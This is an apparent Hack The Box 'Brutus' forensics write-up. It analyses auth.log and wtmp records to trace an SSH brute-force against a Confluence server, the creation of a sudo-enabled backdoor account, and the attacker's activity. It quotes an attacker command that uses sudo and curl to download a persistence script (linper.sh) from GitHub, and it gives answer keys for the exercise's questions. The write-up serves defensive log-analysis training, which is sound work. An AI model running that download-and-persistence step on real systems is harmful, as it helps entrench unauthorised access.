# Brutus

#linux #dfir #log_analysis #wtmp

## Description

In this very easy Sherlock, you will familiarize yourself with Unix auth.log and `wtmp` logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.
## Files

```bash
~/VBoxShare ➜ 7z x .\Brutus.zip -p"hacktheblue" -o"Brutus"

7-Zip 22.01 (x64) : Copyright (c) 1999-2022 Igor Pavlov : 2022-07-15
...
~/VBoxShare ➜ tree /f
Folder PATH listing
Volume serial number is BC69-C561
C:.
│   Brutus.zip
│
└───Brutus
        auth.log
        wtmp
```

## Tasks

### 1. Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?

If we filter the log for SSH we see a common pattern for failed authentication lines. Filter, select and group:
```powershell
➜ cat .\auth.log | sls sshd
...
Mar  6 06:31:40 ip-172-31-35-28 sshd[2380]: Received disconnect from 65.2.161.68 port 46710:11: Bye Bye [preauth]
Mar  6 06:31:40 ip-172-31-35-28 sshd[2380]: Disconnected from invalid user server_adm 65.2.161.68 port 46710 [preauth]
Mar  6 06:31:40 ip-172-31-35-28 sshd[2387]: Connection closed by invalid user svc_account 65.2.161.68 port 46742 [preauth]
Mar  6 06:31:40 ip-172-31-35-28 sshd[2423]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=backup
Mar  6 06:31:40 ip-172-31-35-28 sshd[2424]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=backup
...
➜ cat .\auth.log | sls 'SSHD.*rhost=(.*)\s' | % { $_.Matches.Groups[1].Value.Trim() } | Group-Object

Count Name                      Group
----- ----                      -----
   48 65.2.161.68               {65.2.161.68, 65.2.161.68, 65.2.161.68, 65.2.161.68…}
```

::: tip :bulb: Answer
`65.2.161.68`
:::

### 2. The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?

If we filter by keyword `opened` we see there has been few logins, looks like attackers pwned the `root` user as well as `cyberjunkie` user.

```bash
➜ cat .\auth.log | sls sshd | sls 'opened'

Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: pam_unix(sshd:session): session opened for user cyberjunkie(uid=1002) by (uid=0)
```

::: tip :bulb: Answer
`root`
:::

### 3. Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?

_The **[wtmp](https://linux.die.net/man/5/wtmp)** file records all logins and logouts. Its format is exactly like **[utmp](https://linux.die.net/man/5/utmp)** except that a null username indicates a logout on the associated terminal._

Usually located at:
```http
/var/run/utmp  
/var/log/wtmp
```

For parsing the `wtmp` I used python library: [https://codeberg.org/hjacobs/utmp](https://codeberg.org/hjacobs/utmp)

```python
from datetime import timedelta, timezone
from tabulate import tabulate
import sys
import utmp

with open(sys.argv[1], 'rb') as f: 
    print(
        tabulate(tabular_data=[
            (
                entry.pid,
                entry.type.name,
                entry.user or 'NO_USER',
                entry.host or 'NO_HOST',
                entry.time + timedelta(hours=5)
            ) 
            for entry in utmp.read(f.read())
        ],
        headers='PID Type User Host Time'.split(), 
        tablefmt='fancy_grid')
    )
```

::: info Note
`timedelta +5h` was used to sync time with given auth.log.
:::

```bash
└─$ py parse.py wtmp            
╒════════╤═══════════════╤═════════════╤════════════════╤════════════════════════════╕
│    PID │ Type          │ User        │ Host           │ Time                       │
╞════════╪═══════════════╪═════════════╪════════════════╪════════════════════════════╡
│      0 │ boot_time     │ reboot      │ 6.2.0-1017-aws │ 2024-01-25 11:12:17.804944 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│    601 │ init_process  │ NO_USER     │ NO_HOST        │ 2024-01-25 11:12:31.072401 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│    601 │ login_process │ LOGIN       │ NO_HOST        │ 2024-01-25 11:12:31.072401 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│    618 │ init_process  │ NO_USER     │ NO_HOST        │ 2024-01-25 11:12:31.080342 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│    618 │ login_process │ LOGIN       │ NO_HOST        │ 2024-01-25 11:12:31.080342 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│     53 │ run_lvl       │ runlevel    │ 6.2.0-1017-aws │ 2024-01-25 11:12:33.792454 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│   1284 │ user_process  │ ubuntu      │ 203.101.190.9  │ 2024-01-25 11:13:58.354674 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│   1284 │ dead_process  │ NO_USER     │ NO_HOST        │ 2024-01-25 11:15:12.956114 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│   1483 │ user_process  │ root        │ 203.101.190.9  │ 2024-01-25 11:15:40.806926 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│   1404 │ dead_process  │ NO_USER     │ NO_HOST        │ 2024-01-25 12:34:34.949753 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│ 836798 │ user_process  │ root        │ 203.101.190.9  │ 2024-02-11 10:33:49.408334 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│ 838568 │ init_process  │ NO_USER     │ NO_HOST        │ 2024-02-11 10:39:02.172417 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│ 838568 │ login_process │ LOGIN       │ NO_HOST        │ 2024-02-11 10:39:02.172417 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│ 838962 │ user_process  │ root        │ 203.101.190.9  │ 2024-02-11 10:41:11.700107 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│ 838896 │ dead_process  │ NO_USER     │ NO_HOST        │ 2024-02-11 10:41:46.272984 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│ 842171 │ user_process  │ root        │ 203.101.190.9  │ 2024-02-11 10:54:27.775434 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│ 842073 │ dead_process  │ NO_USER     │ NO_HOST        │ 2024-02-11 11:08:04.769514 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│ 836694 │ dead_process  │ NO_USER     │ NO_HOST        │ 2024-02-11 11:08:04.769963 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│      0 │ run_lvl       │ shutdown    │ 6.2.0-1017-aws │ 2024-02-11 11:09:18.000731 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│      0 │ boot_time     │ reboot      │ 6.2.0-1018-aws │ 2024-03-06 06:17:15.744575 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│    464 │ init_process  │ NO_USER     │ NO_HOST        │ 2024-03-06 06:17:27.354378 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│    464 │ login_process │ LOGIN       │ NO_HOST        │ 2024-03-06 06:17:27.354378 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│    505 │ init_process  │ NO_USER     │ NO_HOST        │ 2024-03-06 06:17:27.469940 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│    505 │ login_process │ LOGIN       │ NO_HOST        │ 2024-03-06 06:17:27.469940 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│     53 │ run_lvl       │ runlevel    │ 6.2.0-1018-aws │ 2024-03-06 06:17:29.538024 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│   1583 │ user_process  │ root        │ 203.101.190.9  │ 2024-03-06 06:19:55.151913 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│   2549 │ user_process  │ root        │ 65.2.161.68    │ 2024-03-06 06:32:45.387923 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│   2491 │ dead_process  │ NO_USER     │ NO_HOST        │ 2024-03-06 06:37:24.590579 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│   2667 │ user_process  │ cyberjunkie │ 65.2.161.68    │ 2024-03-06 06:37:35.475575 │
╘════════╧═══════════════╧═════════════╧════════════════╧════════════════════════════╛
```

Last login as root from suspicious IP is at `2024-03-06 06:32:45.387923`

::: tip :bulb: Answer
`2024-03-06 06:32:45`
:::

### 4. SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

```powershell
➜ cat .\auth.log | sls 'new session.*root'

Mar  6 06:19:54 ip-172-31-35-28 systemd-logind[411]: New session 6 of user root.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root.
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

::: tip :bulb: Answer
`37`
:::

> Hint: _A session number is assigned immediately after the password is accepted._

### 5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

[usermod](https://linux.die.net/man/8/usermod) is a command used to modify account. We see user `cyberjunkie` being added to `sudo` or administrator group.

```powershell
➜ cat .\auth.log | sls usermod

Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
```

::: tip :bulb: Answer
`cyberjunkie`
:::

> Hint: _Auth.log also tracks changes related to users and groups on the server._

### 6. What is the MITRE ATT&CK sub-technique ID used for persistence?

[Persistence](https://attack.mitre.org/tactics/TA0003/): [T1136](https://attack.mitre.org/techniques/T1136)[.001](https://attack.mitre.org/techniques/T1136/001)[Local Account](https://attack.mitre.org/techniques/T1136/001)

`T1136.001`: Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.

::: tip :bulb: Answer
`T1136.001`
:::

### 7. How long did the attacker's first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)

```bash
└─$ py parse.py wtmp            
╒════════╤═══════════════╤═════════════╤════════════════╤════════════════════════════╕
│    PID │ Type          │ User        │ Host           │ Time                       │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
...
│   2549 │ user_process  │ root        │ 65.2.161.68    │ 2024-03-06 06:32:45.387923 │
├────────┼───────────────┼─────────────┼────────────────┼────────────────────────────┤
│   2491 │ dead_process  │ NO_USER     │ NO_HOST        │ 2024-03-06 06:37:24.590579 │
...
╘════════╧═══════════════╧═════════════╧════════════════╧════════════════════════════╛
>>> from datetime import datetime
>>> t1 = datetime.fromisoformat('2024-03-06 06:32:45.387923')
>>> t2 = datetime.fromisoformat('2024-03-06 06:37:24.590579')
>>> int(abs(t1.timestamp() - t2.timestamp()))
279
```

::: tip :bulb: Answer
`279`
:::

### 8. The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

```powershell
➜ cat .\auth.log | sls sudo
...
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
...
```

::: tip :bulb: Answer
`/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
:::

